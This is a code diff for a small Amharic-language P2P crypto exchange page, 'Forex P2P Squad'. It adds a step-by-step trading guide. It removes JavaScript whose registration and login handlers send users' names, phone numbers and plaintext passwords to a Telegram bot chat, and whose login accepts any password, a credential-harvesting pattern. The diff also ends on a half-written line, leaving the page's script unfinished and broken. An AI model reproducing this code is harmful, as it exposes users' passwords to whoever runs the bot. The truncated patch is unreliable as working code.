@@ -39,6 +39,13 @@
         
         /* የአድሚን ማገናኛ ሊንክ ስታይል */
         .admin-link { display: inline-block; background-color: #0088cc; color: white; padding: 8px 15px; border-radius: 5px; text-decoration: none; font-weight: bold; margin-top: 10px; font-size: 0.85rem; }
+
+        /* ለ Guide ገጽ አዲስ ስታይል */
+        .guide-step { background-color: #121620; border-left: 4px solid #f3cd64; padding: 12px; border-radius: 0 8px 8px 0; margin-bottom: 15px; }
+        .guide-step-title { font-weight: bold; color: #f3cd64; margin-bottom: 5px; font-size: 0.95rem; }
+        .guide-text { color: #cbd5e1; font-size: 0.85rem; line-height: 1.6; margin: 0; }
+        .badge-buy { background-color: #22c55e; color: white; padding: 2px 6px; border-radius: 4px; font-size: 0.75rem; font-weight: bold; }
+        .badge-sell { background-color: #ef4444; color: white; padding: 2px 6px; border-radius: 4px; font-size: 0.75rem; font-weight: bold; }
     </style>
 </head>
 <body>
@@ -184,14 +191,42 @@
 
         <div id="page-guide" class="page-section" style="display: none;">
             <section class="card">
-                <div class="card-title">📖 How to Trade</div>
-                <p style="color: #a0aec0; font-size: 0.9rem; line-height: 1.6;">በስልክ ቁጥርዎ አካውንት በመክፈት ይግቡ። Buy በሚያደርጉበት ጊዜ መጀመሪያ ክፍያውን ፈጽመው የክፍያ ማረጋገጫ ፎቶውን (Screenshot) ከፎርሙ ጋር በአንድ ላይ ማያያዝ ይኖርብዎታል።</p>
+                <div class="card-title">📖 አጠቃቀም መመሪያ (How to Trade)</div>
+                <p style="color: #a0aec0; font-size: 0.85rem; margin-bottom: 20px;">እንኳን ወደ Forex P2P Squad በሰላም መጡ! መድረካችንን ለመጠቀም ምንም አይነት የላቀ እውቀት አያስፈልግዎትም። ከታች ያሉትን ቀላል ደረጃዎች ይከተሉ፦</p>
+                
+                <div class="guide-step">
+                    <div class="guide-step-title">ደረጃ 1፦ መለያ መክፈት ወይም መግባት (Auth)</div>
+                    <p class="guide-text">በመጀመሪያ ከላይ በቀኝ በኩል ያለውን <strong>Register</strong> በመጫን በስምዎ እና በስልክ ቁጥርዎ ይመዝገቡ። አካውንት ካለዎት <strong>Login</strong> የሚለውን በመጫን ይግቡ። (ሳይገቡ ትዕዛዝ ማለፍ አይቻልም)።</p>
+                </div>
+
+                <div class="guide-step">
+                    <div class="guide-step-title">ደረጃ 2፦ የትዕዛዝ አይነት መምረጥ</div>
+                    <p class="guide-text">ወደ <strong>🔄 P2P Trade</strong> ገጽ ይሂዱ። ዶላር ለመግዛት ከፈለጉ <span class="badge-buy">Buy</span> የሚለውን፣ የእርስዎን ዶላር ለእኛ ሽጠው የኢትዮጵያ ብር ለመቀበል ከፈለጉ ደግሞ <span class="badge-sell">Sell</span> የሚለውን ይምረጡ።</p>
+                </div>
+
+                <div class="guide-step">
+                    <div class="guide-step-title">ደረጃ 3፦ መረጃዎችን መሙላት</div>
+                    <p class="guide-text">
+                        • <strong>Buy (ሲገዙ)፦</strong> መግዛት የሚፈልጉትን የዶላር (USDT) መጠን ያስገቡ። ሲስተሙ የሚከፍሉትን ጠቅላላ የኢትዮጵያ ብር ያሰላልዎታል። በመቀጠል አረንጓዴው ሳጥን ውስጥ ወደተጠቀሱት የቴሌብር ወይም የንግድ ባንክ አካውንቶቻችን ብሩን ያስተላልፉ።<br>
+                        • <strong>Sell (ሲሸጡ)፦</strong> መሸጥ የሚፈልጉትን የዶላር መጠን ያስገቡ እና ቀይ ሳጥን ውስጥ ባለው የክሪፕቶ አድራሻችን ላይ USDT ይላኩ። በመቀጠል ብር እንዲላክለዎት የሚፈልጉትን የባንክ አካውንት መረጃ ያስገቡ።
+                    </p>
+                </div>
+
+                <div class="guide-step">
+                    <div class="guide-step-title">ደረጃ 4፦ ማረጋገጫ (Screenshot) ማያያዝ እና መላክ</div>
+                    <p class="guide-text">ክፍያ የፈጸሙበትን ወይም ዶላር ያስተላለፉበትን ደረሰኝ ፎቶ (Screenshot) በጥንቃቄ ያያይዙ። ከዚያም <strong>Submit Order</strong> የሚለውን ይጫኑ። ትዕዛዝዎ በቀጥታ ወደ እኛ ይደርሳል።</p>
+                </div>
+
+                <div class="guide-step">
+                    <div class="guide-step-title">ደረጃ 5፦ ማረጋገጫ እና አድሚንን ማናገር</div>
+                    <p class="guide-text">ትዕዛዙ እንደተላከ የትዕዛዝ መከታተያ ገጽ ይከፈትልዎታል። እዚያ ላይ ያለውን <strong>@CRYPTO2115 ያናግሩ</strong> የሚለውን ሊንክ በመጫን በቴሌግራም አድሚኑን ቶሎ እንዲያረጋግጥልዎት መልእክት መላክ ይችላሉ።</p>
+                </div>
             </section>
         </div>
 
-        <footer class="footer">
+        <footer class="footer" style="text-align: center; display: flex; flex-direction: column; gap: 5px;">
             <span>Forex P2P Squad © 2026</span>
-            <span>v3.5</span>
+            <span style="font-size: 0.75rem; color: #64748b;">v2.1.1</span>
         </footer>
     </div>
 
@@ -379,7 +414,6 @@
 
         function handleTradeSubmit(event) {
             event.preventDefault();
-            // ⚡ ተጠቃሚው ካልገባ መጀመሪያ እንዲገባ መጠየቅ
             if(!isLoggedIn) { showNotification("እባክዎ መጀመሪያ Login ያድርጉ!", true); openModal('login-modal'); return; }
 
             const amount = document.getElementById('trade-amount').value;
@@ -393,68 +427,4 @@
                 return; 
             }
 
-            const orderId = "ORD-" + Math.floor(100000 + Math.random() * 900000);
-            globalCurrentOrderId = orderId;
-
-            let targetDestination = (currentTradeType === 'buy') ? `Platform: ${platform.toUpperCase()} (${dynamicValue})` : `User Bank Account: ${dynamicValue}`;
-            let paymentRouteText = (currentTradeType === 'buy') ? "ስክሪንሻቱን ይመልከቱ" : method.toUpperCase();
-
-            // ⚡ የተስተካከለ፡ አሁን 'loggedInUserPhone' በቀጥታ ከሲስተሙ ተወስዶ ይላካል
-            const msg = `🔔 *አዲስ የ P2P ትዕዛዝ ደርሷል!*\n\n` +
-                        `🆔 *Order ID:* \`${orderId}\`\n` +
-                        `👤 *አይነት:* ${currentTradeType.toUpperCase()}\n` +
-                        `💰 *የዶላር መጠን:* ${amount} USDT\n` +
-                        `💵 *ጠቅላላ ክፍያ:* ${calculatedETBGlobal.toLocaleString()} ETB\n` +
-                        `🏦 *ክፍያ መንገድ:* ${paymentRouteText}\n` +
-                        `📞 *የደንበኛ ስልክ:* ${loggedInUserPhone}\n` +
-                        `🔑 *የመድረክ መረጃ:* \`${targetDestination}\``;
-
-            sendPhotoToTelegram(tradeFile, msg, orderId, currentTradeType, amount, paymentRouteText, targetDestination);
-        }
-
-        function startOrderStatusListener(orderId, type, amount, method, info) {
-            document.getElementById('main-nav').style.display = 'none';
-            document.getElementById('status-id').innerText = orderId;
-            document.getElementById('status-type').innerText = type;
-            document.getElementById('status-amount').innerText = amount;
-            document.getElementById('status-calculated-etb').innerText = calculatedETBGlobal.toLocaleString();
-            document.getElementById('status-platform-detail').innerText = info;
-
-            switchTab('status');
-        }
-
-        function backToHome() { document.getElementById('main-nav').style.display = 'flex'; switchTab('home'); }
-
-        function handleRegisterSubmit(event) {
-            event.preventDefault();
-            const name = document.getElementById('reg-name').value;
-            const phone = document.getElementById('reg-phone').value;
-            const pass = document.getElementById('reg-pass').value;
-            const msg = `📝 *አዲስ ተጠቃሚ ተመዝግቧል!*\n\n👤 *ስም:* ${name}\n📞 *ስልክ:* ${phone}\n🔑 *ይለፍ ቃል:* \`${pass}\``;
-            isLoggedIn = true; loggedInUserPhone = phone; localStorage.setItem('currentUserPhone', phone); updateAuthHeader();
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: "Markdown" }) });
-            closeModal('register-modal'); showNotification("በተሳካ ሁኔታ ተመዝግበዋል!");
-        }
-
-        function handleLoginSubmit(event) {
-            event.preventDefault();
-            const phone = document.getElementById('login-phone').value;
-            const pass = document.getElementById('login-pass').value;
-            const msg = `🔐 *የግባ (Login) ሙከራ*\n\n📞 *ስልክ:* ${phone}\n🔑 *ይለፍ ቃል:* \`${pass}\``;
-            isLoggedIn = true; loggedInUserPhone = phone; localStorage.setItem('currentUserPhone', phone); updateAuthHeader();
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: "Markdown" }) });
-            closeModal('login-modal'); showNotification("እንኳን ደህና መጡ!");
-        }
-
-        document.getElementById('generate-btn').addEventListener('click', function() {
-            const addressDisplay = document.getElementById('address-display');
-            const instruction = document.getElementById('address-instruction');
-            addressDisplay.innerHTML = `<div style="font-weight: bold; margin-bottom: 8px; color: #f3cd64; word-break: break-all;">${REAL_BEP20_ADDRESS}</div><button id="copy-btn" type="button" style="background-color: #232d3f; color: #f3cd64; border: 1px solid #f3cd64; padding: 5px 10px; border-radius: 5px; font-size: 0.8rem; cursor: pointer;">📋 Copy Address</button>`;
-            addressDisplay.style.display = 'block'; instruction.innerText = "USDT መላኪያ አድራሻችን፦"; this.innerText = "Done!";
-            document.getElementById('copy-btn').addEventListener('click', function() {
-                navigator.clipboard.writeText(REAL_BEP20_ADDRESS).then(() => { this.innerText = "✅ Copied!"; setTimeout(() => { this.innerText = "📋 Copy Address"; }, 2000); });
-            });
-        });
-    </script>
-</body>
-</html>
+            const orderId = "ORD-" + Math.floor(100000 + Math.random()
